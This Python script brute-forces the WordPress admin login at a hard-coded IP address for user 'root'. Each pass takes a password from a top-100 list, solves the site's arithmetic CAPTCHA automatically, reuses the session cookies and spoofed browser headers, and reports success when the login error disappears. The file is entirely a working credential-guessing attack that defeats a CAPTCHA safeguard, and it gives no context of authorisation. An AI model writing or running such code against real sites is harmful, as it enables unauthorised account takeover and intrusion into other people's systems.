
import requests
import bs4
import re
import time

if __name__ == '__main__':
    
    first_num = re.compile(r'<span>.*\+ (\d+) = (\d+)<\/span>')
    second_num = re.compile(r'<span>(\d+) \+ .* = (\d+)<\/span>')
    result = re.compile(r'<span>(\d+) \+ (\d+) = .*<\/span>')
    cookies_regex = re.compile(r'(mc_session_ids\[(?:default|multi\]\[\d)\]=[\d\w]+)')
    
    with open('top_100', 'r') as input_file:
        for password in input_file.readlines():
    
            request = requests.get('http://167.99.232.57/wordpress/wp-login.php')
            soup = bs4.BeautifulSoup(request.text, 'lxml')
            span = soup.select('span')
            
            a = re.search(first_num, span[0].decode())
            b = re.search(second_num, span[0].decode())
            c = re.search(result, span[0].decode())
            
            cookie_lst = re.findall(cookies_regex, request.headers['Set-Cookie'])
            cookie = 'wordpress_test_cookie=WP+Cookie+check; '
    
            for item in cookie_lst[:-1]:
                cookie += item + '; '
            
            cookie += cookie_lst[-1]

            if a is not None:
                print('? + # = #')
                captcha = int(a.groups()[1]) - int(a.groups()[0])
                data = "log=root&pwd=" + str(password.strip()) + "&mc-value=" + str(captcha) + "&wp-submit=Log+In&redirect_to=http%3A%2F%2F167.99.232.57%2Fwordpress%2Fwp-admin%2F&testcookie=1"
                print(a.groups())
            elif b is not None:
                print('# + ? = #')
                captcha = int(b.groups()[1]) - int(b.groups()[0])                
                data = "log=root&pwd=" + str(password.strip()) + "&mc-value=" + str(captcha) + "&wp-submit=Log+In&redirect_to=http%3A%2F%2F167.99.232.57%2Fwordpress%2Fwp-admin%2F&testcookie=1"
                print(b.groups())
            elif c is not None:
                print('# + # = ?')                
                captcha = int(c.groups()[0]) + int(c.groups()[1])
                data = "log=root&pwd=" + str(password.strip()) + "&mc-value=" + str(captcha) + "&wp-submit=Log+In&redirect_to=http%3A%2F%2F167.99.232.57%2Fwordpress%2Fwp-admin%2F&testcookie=1"
                print(c.groups())
            
            print(data)
            
            len_body = len(data)
            
            url = "http://167.99.232.57/wordpress/wp-login.php"
            
            headers = {
                "Host": "167.99.232.57",
                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate",
                "Referer": "http://167.99.232.57/wordpress/wp-login.php",
                "Content-Type": "application/x-www-form-urlencoded",
                "Content-Length": str(len_body),
                "Cookie": str(cookie),
                "Connection": "close",
                "Upgrade-Insecure-Requests": "1"
            }
            
            request = requests.post(url, headers=headers, data=data)
            soup = bs4.BeautifulSoup(request.text, 'lxml')
            
            lst = []
            
            for div in soup.find_all('div'):
                lst.append(div.get('id'))
            
            if 'login_error' not in lst:
                print('SUCCESS ====>', password)
                break
